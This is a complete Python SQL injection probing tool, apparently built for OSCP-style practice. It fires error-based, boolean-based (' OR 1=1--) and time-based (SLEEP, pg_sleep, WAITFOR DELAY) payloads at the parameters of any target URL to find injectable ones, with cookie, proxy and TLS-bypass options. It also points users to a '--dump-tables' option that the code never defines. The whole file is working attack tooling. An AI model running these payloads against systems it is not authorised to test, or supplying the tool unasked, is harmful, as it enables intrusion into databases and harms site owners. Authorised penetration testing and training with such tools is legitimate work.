```python
#!/usr/bin/env python3
"""
sqli_probe.py - Manual SQL injection detection
Usage: python3 sqli_probe.py -u "http://target/page.php?id=1" --detect
"""

import argparse
import sys
import time
import difflib
import re
from urllib.parse import urlparse, parse_qs

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("pip install requests")
    sys.exit(1)

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
B = '\033[1m'
X = '\033[0m'

def info(s): print(f"{C}[*]{X} {s}")
def good(s): print(f"{G}[+]{X} {s}")
def warn(s): print(f"{Y}[!]{X} {s}")
def bad(s): print(f"{R}[-]{X} {s}")

BOOLEAN_TRUE = ["'", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "1 OR 1=1", '" OR "1"="1']
BOOLEAN_FALSE = ["' AND '1'='2", "' AND 1=2--", "' AND 1=2#", "1 AND 1=2"]

ERROR_SIGS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query()",
    "sqlite3.operationalerror",
    "odbc sql server driver",
    "microsoft ole db provider",
    "ora-",
    "syntax error",
    "division by zero",
    "supplied argument is not a valid",
]

class Requester:
    def __init__(self, url, method="GET", data=None, cookies=None,
                 headers=None, proxy=None, delay=0, timeout=10):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) OSCP-probe/1.0"
        })
        if headers:
            self.session.headers.update(headers)
        if cookies:
            self.session.cookies.update(cookies)
        self.proxies = {"http": proxy, "https": proxy} if proxy else {}
        self.delay = delay
        self.timeout = timeout

    def get(self, params=None):
        time.sleep(self.delay)
        r = self.session.get(self.url, params=params, proxies=self.proxies,
                             timeout=self.timeout, verify=False)
        return r

    def post(self, data=None):
        time.sleep(self.delay)
        r = self.session.post(self.url, data=data or self.data,
                              proxies=self.proxies, timeout=self.timeout,
                              verify=False)
        return r

    def send(self, inject_key, inject_val, base_data=None):
        if self.method == "GET":
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query)
            params[inject_key] = [inject_val]
            flat = {k: v[0] for k, v in params.items()}
            return self.get(params=flat)
        else:
            d = dict(base_data or self.data)
            d[inject_key] = inject_val
            return self.post(data=d)

def detect_params(url, method, data):
    if method == "GET":
        parsed = urlparse(url)
        return list(parse_qs(parsed.query).keys())
    return list(data.keys())

def baseline(req, param):
    return req.send(param, "1")

def check_error_based(req, param):
    hits = []
    for payload in ["'", '"', "\\", ";"]:
        try:
            r = req.send(param, f"1{payload}")
            body = r.text.lower()
            for sig in ERROR_SIGS:
                if sig in body:
                    hits.append((payload, sig))
                    break
        except Exception as e:
            print(f"  [!] Request error: {e}")
    return hits

def check_boolean_based(req, param, base_resp):
    base_len = len(base_resp.text)
    results = []
    for payload in BOOLEAN_TRUE:
        try:
            r = req.send(param, payload)
            ratio = difflib.SequenceMatcher(None, base_resp.text, r.text).ratio()
            results.append((payload, "TRUE ", len(r.text), ratio))
        except Exception:
            pass
    for payload in BOOLEAN_FALSE:
        try:
            r = req.send(param, payload)
            ratio = difflib.SequenceMatcher(None, base_resp.text, r.text).ratio()
            results.append((payload, "FALSE", len(r.text), ratio))
        except Exception:
            pass
    return results

def check_time_based(req, param):
    payloads = [
        ("' AND SLEEP(3)--", 3, "MySQL"),
        ("' AND pg_sleep(3)--", 3, "PostgreSQL"),
        ("'; WAITFOR DELAY '0:0:3'--", 3, "MSSQL"),
    ]
    hits = []
    for payload, expected, db in payloads:
        try:
            t0 = time.time()
            req.send(param, payload)
            elapsed = time.time() - t0
            if elapsed >= expected:
                hits.append((payload, elapsed, db))
        except Exception:
            pass
    return hits

def run_detect(req, url, method, data):
    params = detect_params(url, method, data)
    if not params:
        print("[-] No parameters found. Use --param to specify one manually.")
        return

    print(f"[*] Testing {len(params)} parameter(s): {params}\n")

    for param in params:
        print(f"[*] -- Parameter: {param} --")
        base = baseline(req, param)
        print(f"    Baseline: HTTP {base.status_code}, {len(base.text)} bytes")

        errs = check_error_based(req, param)
        if errs:
            print(f"  [!] ERROR-BASED SQLi likely:")
            for p, sig in errs:
                print(f"      Payload: {p!r}  ->  '{sig}'")

        bools = check_boolean_based(req, param, base)
        true_lens = [l for _, t, l, _ in bools if t.strip() == "TRUE"]
        false_lens = [l for _, t, l, _ in bools if t.strip() == "FALSE"]
        if true_lens and false_lens:
            avg_t = sum(true_lens) / len(true_lens)
            avg_f = sum(false_lens) / len(false_lens)
            if abs(avg_t - avg_f) > 10:
                print(f"  [!] BOOLEAN-BASED SQLi likely (TRUE avg:{avg_t:.0f}b vs FALSE avg:{avg_f:.0f}b)")
                print(f"      Consider using --param {param} --dump-tables")

        print(f"  {'Payload':<35} {'T/F':<7} {'Bytes':<8} {'Similarity'}")
        print(f"  {'-'*35} {'-'*7} {'-'*8} {'-'*10}")
        for p, tf, l, ratio in bools:
            flag = " <" if (tf.strip() == "TRUE" and ratio < 0.95) else ""
            print(f"  {p:<35} {tf:<7} {l:<8} {ratio:.3f}{flag}")

        print("\n  [*] Time-based check (slow)...")
        times = check_time_based(req, param)
        if times:
            for p, elapsed, db in times:
                print(f"  [!] TIME-BASED SQLi ({db}): {elapsed:.1f}s delay with: {p!r}")
        else:
            print("  [-] No time-based delays detected")
        print()

def main():
    ap = argparse.ArgumentParser(description="Manual SQLi probe — OSCP edition")
    ap.add_argument("-u", "--url", required=True, help="Target URL")
    ap.add_argument("--method", default="GET", help="HTTP method (GET/POST)")
    ap.add_argument("--data", default="", help="POST data: key=val&key2=val2")
    ap.add_argument("--param", default=None, help="Specific param to target")
    ap.add_argument("--cookies", default="", help="Cookies: name=val;name2=val2")
    ap.add_argument("--proxy", default=None, help="Proxy URL e.g. http://127.0.0.1:8080")
    ap.add_argument("--delay", default=0.0, type=float, help="Delay between requests (s)")
    ap.add_argument("--detect", action="store_true", help="Run full detection")
    args = ap.parse_args()

    def parse_kv(s):
        if not s:
            return {}
        d = {}
        for pair in s.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                d[k] = v
        return d

    post_data = parse_kv(args.data)
    cookies = parse_kv(args.cookies.replace(";", "&"))

    req = Requester(
        url=args.url,
        method=args.method.upper(),
        data=post_data,
        cookies=cookies,
        proxy=args.proxy,
        delay=args.delay,
    )

    print(f"\n[*] Target : {args.url}")
    print(f"[*] Method : {args.method.upper()}")
    if post_data:
        print(f"[*] Data   : {post_data}")
    print()

    if args.detect:
        run_detect(req, args.url, args.method.upper(), post_data)

if __name__ == "__main__":
    main()
```